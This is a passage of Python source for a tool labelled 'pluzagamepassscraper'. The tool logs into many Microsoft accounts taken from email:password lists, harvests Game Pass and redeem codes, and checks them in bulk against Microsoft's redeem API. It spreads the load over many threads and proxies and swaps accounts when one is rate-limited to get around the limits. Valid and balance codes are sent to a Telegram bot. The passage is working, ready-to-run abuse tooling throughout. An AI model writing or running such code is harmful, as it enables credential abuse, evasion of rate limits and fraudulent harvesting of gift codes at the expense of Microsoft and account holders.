umber","sc_moraycarousel","sc_moraystyle","sc_moraystylefull","sc_narratoraddress","sc_newcheckoutselectorforxboxcom","sc_newconversionurl","sc_newflexiblepaymentsmessage","sc_newrecoprod","sc_noawaitforupdateordercall","sc_norcalifornialaw","sc_norcalifornialawlog","sc_norcalifornialawstate","sc_nornewacceptterms","sc_officescds","sc_optionalcatalogclienttype","sc_ordercheckoutfix","sc_orderpisyncdisabled","sc_orderstatusoverridemstfix","sc_outofstock","sc_passthroughculture","sc_paymentchallengets","sc_paymentoptionnotfound","sc_paymentsessioninsummarypage","sc_pidlignoreesckey","sc_pitelemetryupdates","sc_preloadpidlcontainerts","sc_productforlicenseterms","sc_productimageoptimization","sc_prominenteddchange","sc_promocode","sc_promocodecheckout","sc_purchaseblock","sc_purchaseblockerrorhandling","sc_purchasedblocked","sc_purchasedblockedby","sc_quantitycap","sc_railv2","sc_reactcheckout","sc_readytopurchasefix","sc_redeemfocusforce","sc_reloadiflineitemdiscrepancy","sc_removepaddingctalegaltext","sc_removeresellerforstoreapp","sc_resellerdetail","sc_restoregiftfieldlimits","sc_returnoospsatocart","sc_routechangemessagetoxboxcom","sc_rspv2","sc_scenariotelemetryrefactor","sc_separatedigitallicenseterms","sc_setbehaviordefaultvalue","sc_shippingallowlist","sc_showcontactsupportlink","sc_showtax","sc_skippurchaseconfirm","sc_skipselectpi","sc_splipidltresourcehelper","sc_splittaxv2","sc_staticassetsimport","sc_surveyurlv2","sc_taxamountsubjecttochange","sc_testflight","sc_twomonthslegalstringforcn","sc_updateallowedpaymentmethodstoadd","sc_updatebillinginfo","sc_updatedcontactpreferencemarkets","sc_updateformatjsx","sc_updatetosubscriptionpricev2","sc_updatewarrantycompletesurfaceproinlinelegalterm","sc_updatewarrantytermslink","sc_usefullminimaluhf","sc_usehttpsurlstrings","sc_uuid","sc_xboxcomnosapi","sc_xboxrecofix","sc_xboxredirection","sc_xdlshipbuffer"],
                "tokenIdentifierValue": code,
                "supportsCsvTypeTokenOnly": False,
                "buyNowScenario": "redeem",
                "clientContext": {
                    "client": "AccountMicrosoftCom",
                    "deviceFamily": "Web"
                }
            }

            if prepare_redeem_executor:
                future = prepare_redeem_executor.submit(prepare_redeem_api_call, session, code, headers, payload)
                response = future.result(timeout=35)
            else:
                response = prepare_redeem_api_call(session, code, headers, payload)
            
            if not response:
                return {"status": "ERROR", "message": "Request failed"}
        except Exception as e:
            return {"status": "ERROR", "message": f"Request failed: {str(e)}"}
        
        if response.status_code == 429:
            return {"status": "RATE_LIMITED", "message": "Account rate limited (HTTP 429)"}
                
        if response.status_code != 200:
            return {"status": "ERROR", "message": f"Request failed with status {response.status_code}"}
            
        data = response.json()

        if "tokenType" in data and data["tokenType"] == "CSV":
            value = data.get("value")
            currency = data.get("currency")
            return {"status": "BALANCE_CODE", "message": f"{code} | {value} {currency}"}
        
        if "errorCode" in data and data["errorCode"] == "TooManyRequests":
            return {"status": "RATE_LIMITED", "message": "Account rate limited (TooManyRequests)"}
        
        if "error" in data and isinstance(data["error"], dict) and "code" in data["error"]:
            if data["error"]["code"] == "TooManyRequests" or "rate" in data["error"].get("message", "").lower():
                return {"status": "RATE_LIMITED", "message": "Account rate limited (error message)"}
        
        if "events" in data and "cart" in data["events"] and data["events"]["cart"]:
            cart_event = data["events"]["cart"][0]
            
            if "type" in cart_event and cart_event["type"] == "error":
                if cart_event.get("code") == "TooManyRequests" or "TooManyRequests" in str(cart_event):
                    return {"status": "RATE_LIMITED", "message": "Account rate limited (cart event)"}
            
            if "data" in cart_event and "reason" in cart_event["data"]:
                reason = cart_event["data"]["reason"]
                
                if "TooManyRequests" in reason or "RateLimit" in reason:
                    return {"status": "RATE_LIMITED", "message": f"Account rate limited ({reason})"}
                
                if reason == "RedeemTokenAlreadyRedeemed":
                    return {"status": "REDEEMED", "message": f"{code} | REDEEMED"}
                
                elif reason in ["RedeemTokenExpired", "LegacyTokenAuthenticationNotProvided", 
                               "RedeemTokenNoMatchingOrEligibleProductsFound"]:
                    return {"status": "EXPIRED", "message": f"{code} | EXPIRED"}
                
                elif reason == "RedeemTokenStateDeactivated":
                    return {"status": "DEACTIVATED", "message": f"{code} | DEACTIVATED"}
                
                elif reason == "RedeemTokenGeoFencingError":
                    return {"status": "REGION_LOCKED", "message": f"{code} | REGION_LOCKED"}
                
                elif reason in ["RedeemTokenNotFound", "InvalidProductKey", "RedeemTokenStateUnknown"]:
                    return {"status": "INVALID", "message": f"{code} | INVALID"}
                
                else:
                    return {"status": "INVALID", "message": f"{code} | INVALID"}
        
        if "products" in data and len(data["products"]) > 0:
            product_info = data.get("productInfos", [{}])[0]
            product_id = product_info.get("productId")
            
            for product in data["products"]:
                if product.get("id") == product_id and "sku" in product and product["sku"]:
                    product_title = product["sku"].get("title", "Unknown Title")
                    is_pi_required = product_info.get("isPIRequired", False)
                    
                    if is_pi_required:
                        return {
                            "status": "VALID_REQUIRES_CARD",
                            "product_title": product_title,
                            "message": f"{code} | {product_title}"
                        }
                    else:
                        return {
                            "status": "VALID",
                            "product_title": product_title,
                            "message": f"{code} | {product_title}"
                        }
                elif product.get("id") == product_id:
                    product_title = product.get("title", "Unknown Title")
                    is_pi_required = product_info.get("isPIRequired", False)
                    
                    if is_pi_required:
                        return {
                            "status": "VALID_REQUIRES_CARD",
                            "product_title": product_title,
                            "message": f"{code} | {product_title}"
                        }
                    else:
                        return {
                            "status": "VALID",
                            "product_title": product_title,
                            "message": f"{code} | {product_title}"
                        }
        
        return {"status": "UNKNOWN", "message": f"{code} | UNKNOWN"}
        
    except Exception as e:
        return {"status": "ERROR", "message": f"{code} | Error: {str(e)}"}

def validate_code(session, code, force_refresh_ids=False, prepare_redeem_executor=None):
    try:
        result = validate_code_primary(session, code, force_refresh_ids, prepare_redeem_executor)
        status = result.get('status', 'ERROR')
        message = result.get('message', 'Unknown error')
        
        if isinstance(result, dict):
            if result['status'] == 'VALID':
                title = result['product_title'] if 'product_title' in result else message.split(' | ')[-1] if ' | ' in message else "Unknown Title"
                print_colored(f"{code} | {title}", Fore.GREEN)
                send_telegram_message(f"✅ *Valid Code Found!*\n`{code}` | {title}")
                return result
            elif result['status'] == 'VALID_REQUIRES_CARD':
                title = result['product_title'] if 'product_title' in result else message.split(' | ')[-1] if ' | ' in message else "Unknown Title"
                print_colored(f"{code} | {title}", Fore.YELLOW)
                send_telegram_message(f"💳 *Valid (Requires Card) Code Found!*\n`{code}` | {title}")
                return result
            elif result['status'] == 'REDEEMED':
                print_colored(f"{code} | REDEEMED", Fore.RED)
                return result
            elif result['status'] == 'EXPIRED':
                print_colored(f"{code} | EXPIRED", Fore.RED)
                return result
            elif result['status'] == 'REGION_LOCKED':
                print_colored(f"{code} | REGION_LOCKED", Fore.MAGENTA)
                return result
            elif result['status'] == 'UNKNOWN':
                print_colored(f"{code} | UNKNOWN", Fore.YELLOW)
                return result
            elif result['status'] == 'BALANCE_CODE':
                clean_msg = message.split(' | ', 1)[1] if ' | ' in message else message
                print_colored(f"{code} | {clean_msg}", Fore.GREEN)
                send_telegram_message(f"💰 *Balance Code Found!*\n`{code}` | {clean_msg}")
                return result
            elif result['status'] == 'RATE_LIMITED':
                return result
            else:
                print_colored(f"{code} | {result['status']}", Fore.RED)
                return result
        else:
            return {"status": "ERROR", "message": "Result is not a dictionary"}
    except Exception as e:
        return {"status": "ERROR", "message": str(e)}

def process_code_check(session, code, email, result_files, results_count, processed_codes_lock, processed_codes, total_codes, rate_limited_accounts, prepare_redeem_executor=None):
    try:
        with processed_codes_lock:
            if code in processed_codes:
                return True, False
        
        result = validate_code(session, code, force_refresh_ids=False, prepare_redeem_executor=prepare_redeem_executor)
        status = result.get('status', 'ERROR')

        if status == 'ERROR':
            with print_lock:
                error_msg = result.get('message', 'Unknown error')
                print(f"{Fore.RED}Error checking code {code} with account {email}: {error_msg}{Style.RESET_ALL}")
            return False, False

        elif status == 'RATE_LIMITED':
            if rate_limited_accounts is not None and email not in rate_limited_accounts:
                with print_lock:
                    print(f"{Fore.YELLOW}Account {email} got rate-limited.{Style.RESET_ALL}")
                rate_limited_accounts.append(email)
            return False, True

        else:
            file_key = None
            if status in ['VALID', 'VALID_REQUIRES_CARD']:
                file_key = status
            elif status == 'BALANCE_CODE':
                file_key = 'VALID'
            elif status in ['REDEEMED', 'EXPIRED', 'DEACTIVATED', 'INVALID']:
                file_key = 'INVALID'
            elif status in ['REGION_LOCKED', 'UNKNOWN']:
                file_key = status
            
            if not file_key:
                file_key = 'INVALID'
            
            result_line = f"{result.get('message', f'{code} | {status}')}\n"
            
            with processed_codes_lock:
                if file_key in results_count:
                    results_count[file_key] += 1
                if code not in processed_codes:
                    processed_codes.add(code)
                
                if file_key in result_files:
                    try:
                        with open(result_files[file_key], 'a') as f:
                            f.write(result_line)
                    except Exception as fe:
                        pass

            return True, False

    except Exception as e:
        with print_lock:
            print(f"{Fore.RED}Exception checking code {code} with account {email}: {str(e)}{Style.RESET_ALL}")
        return False, False

def process_codes_for_account(account, codes_queue, result_files, results_count, processed_codes_lock, processed_codes, total_codes, prepare_redeem_executor=None, proxy=None, rate_limited_accounts=None):
    email, password = account
    session = login_microsoft_account(email, password, proxy)

    if not session:
        with print_lock:
            print(f"{Fore.RED}Invalid - {email}{Style.RESET_ALL}")
        return

    with print_lock:
        print(f"{Fore.GREEN}Logged in {email}{Style.RESET_ALL}")

    codes_checked = 0
    empty_attempts = 0
    max_empty_attempts = 3
    
    while True:
        if rate_limited_accounts is not None and email in rate_limited_accounts:
            return
        
        try:
            code = codes_queue.get(timeout=5)
            empty_attempts = 0
        except queue.Empty:
            empty_attempts += 1
            with processed_codes_lock:
                remaining_codes = total_codes - len(processed_codes)
            if remaining_codes <= 0 or empty_attempts >= max_empty_attempts:
                return
            continue
        
        try:
            success, is_rate_limited = process_code_check(
                session, code, email, result_files, results_count,
                processed_codes_lock, processed_codes, total_codes, rate_limited_accounts,
                prepare_redeem_executor
            )
            
            if is_rate_limited:
                codes_queue.put(code)
                return
            elif success:
                codes_checked += 1
            else:
                codes_queue.put(code)
        except Exception as e:
            with print_lock:
                print(f"{Fore.RED}Error processing code {code} with account {email}: {str(e)}{Style.RESET_ALL}")
            codes_queue.put(code)
        finally:
            codes_queue.task_done()

# ============================================================================
# MAIN
# ============================================================================

def select_accounts_file():
    """Open file dialog to select accounts file"""
    root = tk.Tk()
    root.withdraw()  # Hide the main window
    root.attributes('-topmost', True)  # Bring dialog to front
    
    file_path = filedialog.askopenfilename(
        title="Select Accounts File",
        filetypes=[
            ("Text files", "*.txt"),
            ("All files", "*.*")
        ],
        initialdir=os.getcwd()
    )
    
    root.destroy()
    return file_path

def read_accounts(file_path):
    accounts = []
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and ':' in line and not line.startswith('#'):
                    parts = line.split(':', 1)
                    accounts.append((parts[0].strip(), parts[1].strip()))
    except FileNotFoundError:
        pass
    return accounts

def show_main_menu():
    """Display main menu"""
    while True:
        clear_screen()
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"🎮 Main Menu{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}  [1] pgs - pluzagamepassscraper{Style.RESET_ALL}")
        print(f"{Fore.WHITE}  [2] proxies{Style.RESET_ALL}")
        print(f"{Fore.WHITE}  [3] settings{Style.RESET_ALL}")
        print(f"{Fore.WHITE}  [4] exit{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
        
        choice = input(f"{Fore.YELLOW}Select option (1/2/3/4): {Style.RESET_ALL}").strip()
        
        if choice == '1':
            run_gamepass_scraper()
        elif choice == '2':
            proxy_menu()
        elif choice == '3':
            settings_menu()
        elif choice == '4':
            print(f"{Fore.GREEN}👋 Goodbye!{Style.RESET_ALL}")
            break
        else:
            print(f"{Fore.RED}❌ Invalid choice. Please select 1-4.{Style.RESET_ALL}")
            time.sleep(1)

def proxy_menu():
    """Proxy management menu"""
    clear_screen()
    print(f"\n{Fore.CYAN}🌐 Proxy Management{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.WHITE}  [1] Test proxies from proxies.txt{Style.RESET_ALL}")
    print(f"{Fore.WHITE}  [2] Load custom proxy file{Style.RESET_ALL}")
    print(f"{Fore.WHITE}  [3] Back to main menu{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
    
    choice = input(f"{Fore.YELLOW}Select option (1/2/3): {Style.RESET_ALL}").strip()
    
    if choice == '1':
        proxies = read_proxies('proxies.txt')
        if proxies:
            print(f"{Fore.GREEN}✅ Loaded {len(proxies)} proxies from proxies.txt{Style.RESET_ALL}")
            test_choice = input(f"{Fore.YELLOW}Test these proxies? (y/n): {Style.RESET_ALL}").strip().lower()
            if test_choice in ['y', 'yes']:
                working_proxies = test_proxies_threaded(proxies, min(50, len(proxies)))
                if working_proxies:
                    print(f"{Fore.GREEN}✅ {len(working_proxies)} proxies working!{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}❌ No proxies found in proxies.txt{Style.RESET_ALL}")
        input(f"{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
    elif choice == '2':
        custom_file = input(f"{Fore.YELLOW}Enter proxy file path: {Style.RESET_ALL}").strip()
        if custom_file:
            proxies = read_proxies(custom_file)
            if proxies:
                print(f"{Fore.GREEN}✅ Loaded {len(proxies)} proxies from {custom_file}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}❌ No valid proxies found{Style.RESET_ALL}")
        input(f"{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
    elif choice == '3':
        return
    else:
        print(f"{Fore.RED}❌ Invalid choice{Style.RESET_ALL}")
        time.sleep(1)

def settings_menu():
    """Settings menu"""
    while True:
        clear_screen()
        print(f"\n{Fore.CYAN}⚙️ Settings{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}  [1] View license status{Style.RESET_ALL}")
        print(f"{Fore.WHITE}  [2] Configuration{Style.RESET_ALL}")
        print(f"{Fore.WHITE}  [3] Telegram Bot Settings{Style.RESET_ALL}")
        print(f"{Fore.WHITE}  [4] Back to main menu{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
        
        choice = input(f"{Fore.YELLOW}Select option (1/2/3/4): {Style.RESET_ALL}").strip()
        
        if choice == '1':
            hwid = get_hwid()
            licenses_data = fetch_licenses(LICENSE_URL)
            license_info = check_license(hwid, licenses_data)
            display_license_status(license_info, hwid)
            input(f"{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
        elif choice == '2':
            while True:
                clear_screen()
                print(f"\n{Fore.CYAN}⚙️ Configuration{Style.RESET_ALL}")
                print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
                print(f"{Fore.WHITE}  [1] Thread Settings{Style.RESET_ALL}")
                print(f"{Fore.WHITE}  [2] View Current Config{Style.RESET_ALL}")
                print(f"{Fore.WHITE}  [3] Back to Settings{Style.RESET_ALL}")
                print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
                
                config_choice = input(f"{Fore.YELLOW}Select option (1/2/3): {Style.RESET_ALL}").strip()
                
                if config_choice == '1':
                    clear_screen()
                    print(f"\n{Fore.CYAN}🧵 Thread Configuration{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
                    print(f"{Fore.WHITE}Current Settings:{Style.RESET_ALL}")
                    print(f"  Fetch Threads: {Fore.GREEN}{CONFIG['fetch_threads']}{Style.RESET_ALL}")
                    print(f"  Validate Threads: {Fore.GREEN}{CONFIG['validate_threads']}{Style.RESET_ALL}")
                    print(f"  Max Threads: {Fore.GREEN}{CONFIG['max_threads']}{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
                    
                    print(f"{Fore.YELLOW}Enter new values (press Enter to keep current):{Style.RESET_ALL}")
                    
                    try:
                        new_fetch = input(f"Fetch Threads (current: {CONFIG['fetch_threads']}): ").strip()
                        if new_fetch:
                            fetch_val = int(new_fetch)
                            if 1 <= fetch_val <= 100:
                                CONFIG['fetch_threads'] = fetch_val
                            else:
                                print(f"{Fore.RED}❌ Must be between 1-100{Style.RESET_ALL}")
                                time.sleep(1)
                                continue
                        
                        new_validate = input(f"Validate Threads (current: {CONFIG['validate_threads']}): ").strip()
                        if new_validate:
                            validate_val = int(new_validate)
                            if 1 <= validate_val <= 100:
                                CONFIG['validate_threads'] = validate_val
                            else:
                                print(f"{Fore.RED}❌ Must be between 1-100{Style.RESET_ALL}")
                                time.sleep(1)
                                continue
                        
                        new_max = input(f"Max Threads (current: {CONFIG['max_threads']}): ").strip()
                        if new_max:
                            max_val = int(new_max)
                            if 1 <= max_val <= 100:
                                CONFIG['max_threads'] = max_val
                            else:
                                print(f"{Fore.RED}❌ Must be between 1-100{Style.RESET_ALL}")
                                time.sleep(1)
                                continue
                        
                        if save_config(CONFIG):
                            print(f"{Fore.GREEN}✅ Configuration saved successfully!{Style.RESET_ALL}")
                        else:
                            print(f"{Fore.RED}❌ Failed to save configuration{Style.RESET_ALL}")
                        
                    except ValueError:
                        print(f"{Fore.RED}❌ Please enter valid numbers{Style.RESET_ALL}")
                    
                    input(f"{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
                    
                elif config_choice == '2':
                    clear_screen()
                    print(f"\n{Fore.CYAN}📋 Current Configuration{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
                    print(f".  Fetch Threads: {Fore.GREEN}{CONFIG['fetch_threads']}{Style.RESET_ALL}")
                    print(f"  Validate Threads: {Fore.GREEN}{CONFIG['validate_threads']}{Style.RESET_ALL}")
                    print(f"  Max Threads: {Fore.GREEN}{CONFIG['max_threads']}{Style.RESET_ALL}")
                    print(f"  License URL: {LICENSE_URL}{Style.RESET_ALL}")
                    print(f"  Config File: {CONFIG_FILE}{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
                    input(f"{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
                    
                elif config_choice == '3':
                    break
                else:
                    print(f"{Fore.RED}❌ Invalid choice{Style.RESET_ALL}")
                    time.sleep(1)
                    
        elif choice == '3':
            clear_screen()
            print(f"\n{Fore.CYAN}🤖 Telegram Bot Settings{Style.RESET_ALL}")
            print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
            print(f"Current BOT_TOKEN: {Fore.GREEN}{CONFIG.get('BOT_TOKEN', 'Not Set')}{Style.RESET_ALL}")
            print(f"Current CHAT_ID: {Fore.GREEN}{CONFIG.get('CHAT_ID', 'Not Set')}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
            
            new_token = input(f"{Fore.YELLOW}Enter new BOT_TOKEN (Leave empty to skip): {Style.RESET_ALL}").strip()
            if new_token:
                CONFIG["BOT_TOKEN"] = new_token
            new_chat = input(f"{Fore.YELLOW}Enter new CHAT_ID (Leave empty to skip): {Style.RESET_ALL}").strip()
            if new_chat:
                CONFIG["CHAT_ID"] = new_chat
                
            if new_token or new_chat:
                if save_config(CONFIG):
                    print(f"{Fore.GREEN}✅ Telegram settings successfully updated and saved!{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}❌ Failed to save config.{Style.RESET_ALL}")
            input(f"{Fore.CYAN}Press Enter to return to settings menu...{Style.RESET_ALL}")
            
        elif choice == '4':
            return
        else:
            print(f"{Fore.RED}❌ Invalid choice{Style.RESET_ALL}")
            time.sleep(1)

def test_proxies_threaded(proxies, max_threads):
    """Test proxies with multiple threads"""
    if not proxies:
        return []
    
    working_proxies = []
    total = len(proxies)
    
    print(f"\n{Fore.CYAN}🧪 Testing {total} proxies with {max_threads} threads...{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    
    def test_proxy(proxy_string, timeout=7.5):
        try:
            proxy_dict = get_random_proxy([proxy_string])
            if not proxy_dict:
                return False, "Invalid proxy format"
            
            session = requests.Session()
            session.proxies = proxy_dict
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
            })
            
            response = session.get('https://login.live.com/', timeout=timeout)
            
            if response.status_code == 200:
                return True, f"Working (HTTP {response.status_code})"
            else:
                return False, f"HTTP {response.status_code}"
                
        except requests.exceptions.Timeout:
            return False, "Timeout (7.5s)"
        except requests.exceptions.ProxyError:
            return False, "Proxy connection error"
        except requests.exceptions.ConnectionError:
            return False, "Connection error"
        except Exception as e:
            return False, f"Error: {str(e)[:30]}"
        finally:
            session.close()
    
    def test_worker(proxy, idx):
        is_working, message = test_proxy(proxy)
        if is_working:
            working_proxies.append(proxy)
            safe_print(f"{Fore.GREEN}[{idx}/{total}] ✅ {proxy[:30]}... - {message}{Style.RESET_ALL}")
        else:
            safe_print(f"{Fore.RED}[{idx}/{total}] ❌ {proxy[:30]}... - {message}{Style.RESET_ALL}")
    
    start_time = time.time()
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = {executor.submit(test_worker, proxy, i+1): i for i, proxy in enumerate(proxies)}
        for future in as_completed(futures):
            pass  # Wait for all to complete
    
    elapsed = time.time() - start_time
    print(f"\n{Fore.GREEN}✅ Proxy testing completed in {elapsed:.1f}s{Style.RESET_ALL}")
    print(f"{Fore.GREEN}📊 {len(working_proxies)}/{total} proxies working{Style.RESET_ALL}")
    
    return working_proxies

def run_gamepass_scraper():
    """Run the gamepass scraper functionality"""
    clear_screen()
    print_banner()
    
    # ==================== LOAD ACCOUNTS ====================
    print(f"\n{Fore.CYAN}📂 Operation Selection{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.WHITE}  [1] Fetch codes + validate + sort{Style.RESET_ALL}")
    print(f"{Fore.WHITE}  [2] Sort codes only{Style.RESET_ALL}")
    print(f"{Fore.WHITE}  [3] Back to main menu{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
    
    choice = input(f"{Fore.YELLOW}Select option (1/2/3): {Style.RESET_ALL}").strip()
    
    if choice == '1':
        # Fetch + validate + sort
        print(f"{Fore.CYAN}📂 Account Selection{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}  [1] Choose file from file selector{Style.RESET_ALL}")
        print(f"{Fore.WHITE}  [2] Use accounts.txt{Style.RESET_ALL}")
        print(f"{Fore.WHITE}  [3] Back to main menu{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
        
        account_choice = input(f"{Fore.YELLOW}Select option (1/2/3): {Style.RESET_ALL}").strip()
        
        if account_choice == '1':
            print(f"{Fore.CYAN}📂 Select accounts file...{Style.RESET_ALL}")
            accounts_file = select_accounts_file()
            if not accounts_file:
                print(f"{Fore.RED}❌ No file selected{Style.RESET_ALL}")
                input(f"{Fore.CYAN}Press Enter to return to main menu...{Style.RESET_ALL}")
                return
            accounts = read_accounts(accounts_file)
            if accounts:
                print(f"{Fore.CYAN}📂 Loaded {len(accounts)} accounts from {os.path.basename(accounts_file)}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}❌ No valid accounts found in {os.path.basename(accounts_file)}{Style.RESET_ALL}")
                input(f"{Fore.CYAN}Press Enter to return to main menu...{Style.RESET_ALL}")
                return
        elif account_choice == '2':
            accounts = read_accounts('accounts.txt')
            if not accounts:
                print(f"{Fore.RED}❌ No accounts in accounts.txt{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}Create accounts.txt with format: email:password{Style.RESET_ALL}")
                input(f"{Fore.CYAN}Press Enter to return to main menu...{Style.RESET_ALL}")
                return
            print(f"{Fore.CYAN}📂 Loaded {len(accounts)} accounts from accounts.txt{Style.RESET_ALL}")
        elif account_choice == '3':
            return
        else:
            print(f"{Fore.RED}❌ Invalid choice{Style.RESET_ALL}")
            input(f"{Fore.CYAN}Press Enter to return to main menu...{Style.RESET_ALL}")
            return
         
        # Ask for proxy settings
        proxies = ask_proxy_settings()
        
        if proxies is None:
            print(f"{Fore.RED}❌ Proxy configuration cancelled{Style.RESET_ALL}")
            input(f"{Fore.CYAN}Press Enter to return to main menu...{Style.RESET_ALL}")
            return
        
        # Run fetch + validate + sort (option 3)
        run_operation('3', accounts, proxies)
        
    elif choice == '2':
        # Sort codes only
        sort_existing_codes()
    elif choice == '3':
        return
    else:
        print(f"{Fore.RED}❌ Invalid choice{Style.RESET_ALL}")
        input(f"{Fore.CYAN}Press Enter to return to main menu...{Style.RESET_ALL}")
        return

def run_operation(choice, accounts, proxies):
    """Execute the selected operation"""
    all_codes = []
    
    # ==================== FETCH ====================
    if choice in ['1', '3']:
        fetch_threads = min(CONFIG['fetch_threads'], len(accounts))
        
        # Ensure we don't exceed max_threads
        fetch_threads = min(fetch_threads, CONFIG['max_threads'])
        
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"🚀 FETCHING CODES (parallel){Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Using {fetch_threads} threads for {len(accounts)} accounts{Style.RESET_ALL}\n")
        
        start = time.time()
        with ThreadPoolExecutor(max_workers=fetch_threads) as executor:
            futures = {executor.submit(fetch_account_worker, email, pwd, i+1, len(accounts)): i 
                      for i, (email, pwd) in enumerate(accounts)}
            for future in as_completed(futures):
                codes = future.result()
                all_codes.extend(codes)
        
        elapsed = time.time() - start
        print(f"\n{Fore.GREEN}✅ Fetched {len(all_codes)} codes in {elapsed:.1f}s{Style.RESET_ALL}")
        
        if all_codes:
            with open('codes.txt', 'w') as f:
                f.write('\n'.join(all_codes))
            print(f"{Fore.GREEN}💾 Saved to codes.txt{Style.RESET_ALL}\n")
    
    # ==================== VALIDATE ====================
    if choice in ['2', '3']:
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"🔍 VALIDATING CODES (queue-based like standalone checker){Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
        
        if choice == '2':
            try:
                with open('codes.txt', 'r') as f:
                    all_codes = [line.strip().split('|')[0].strip() for line in f if line.strip()]
            except:
                print(f"{Fore.RED}❌ codes.txt not found{Style.RESET_ALL}")
                input(f"{Fore.CYAN}Press Enter to return to main menu...{Style.RESET_ALL}")
                return
        
        if not all_codes:
            print(f"{Fore.RED}❌ No codes to validate{Style.RESET_ALL}")
            input(f"{Fore.CYAN}Press Enter to return to main menu...{Style.RESET_ALL}")
            return
        
        print(f"{Fore.WHITE}📝 {len(all_codes)} codes to validate{Style.RESET_ALL}")
        if proxies:
            print(f"{Fore.GREEN}🌐 Using {len(proxies)} proxies{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}⚠️ No proxies - using direct connection{Style.RESET_ALL}")
        print()
        
        # Thread count - use configured value
        validate_threads = min(CONFIG['validate_threads'], len(accounts))
        validate_threads = min(validate_threads, CONFIG['max_threads'])
        
        print(f"{Fore.WHITE}🧵 Using {validate_threads} threads (configured in settings){Style.RESET_ALL}")
        
        # Allow user to override the configured thread count
        while True:
            try:
                user_input = input(f"{Fore.CYAN}Thread Count? (1-{len(accounts)}) [Enter for {validate_threads}]: {Style.RESET_ALL}").strip()
                if not user_input:
                    batch_size = validate_threads
                    break
                batch_size = int(user_input)
                if 1 <= batch_size <= len(accounts):
                    break
                else:
                    print(f"{Fore.RED}Please enter a number between 1 and {len(accounts)}{Style.RESET_ALL}")
            except ValueError:
                print(f"{Fore.RED}Please enter a valid number{Style.RESET_ALL}")
        
        # Create results folder
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        results_folder = f"results/check_{timestamp}"
        os.makedirs(results_folder, exist_ok=True)
        
        result_files = {
            'VALID': f'{results_folder}/valid_codes.txt',
            'VALID_REQUIRES_CARD': f'{results_folder}/valid_cardrequired_codes.txt',
            'INVALID': f'{results_folder}/invalid.txt',
            'UNKNOWN': f'{results_folder}/unknown_codes.txt',
            'REGION_LOCKED': f'{results_folder}/region_locked_codes.txt',
        }
        
        results_count = {status: 0 for status in result_files.keys()}
        
        # Create files
        for file_path in result_files.values():
            with open(file_path, 'a'):
                pass
        
        # Setup queue
        codes_queue = queue.Queue()
        for code in all_codes:
            codes_queue.put(code)
        
        print(f"Added {len(all_codes)} codes to the queue\n")
        
        processed_codes = set()
        processed_codes_lock = threading.Lock()
        rate_limited_accounts = []
        
        prepare_redeem_executor = ThreadPoolExecutor(max_workers=5)
        
        start = time.time()
        try:
            with ThreadPoolExecutor(max_workers=batch_size) as account_executor:
                account_futures = {
                    account_executor.submit(
                        process_codes_for_account,
                        account,
                        codes_queue,
                        result_files,
                        results_count,
                        processed_codes_lock,
                        processed_codes,
                        len(all_codes),
                        prepare_redeem_executor,
                        get_random_proxy(proxies) if proxies else None,
                        rate_limited_accounts
                    ): account for account in accounts
                }
                
                for future in as_completed(account_futures):
                    pass
        finally:
            prepare_redeem_executor.shutdown(wait=True)
        
        elapsed = time.time() - start
        
        # Summary
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"📊 RESULTS ({elapsed:.1f}s){Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
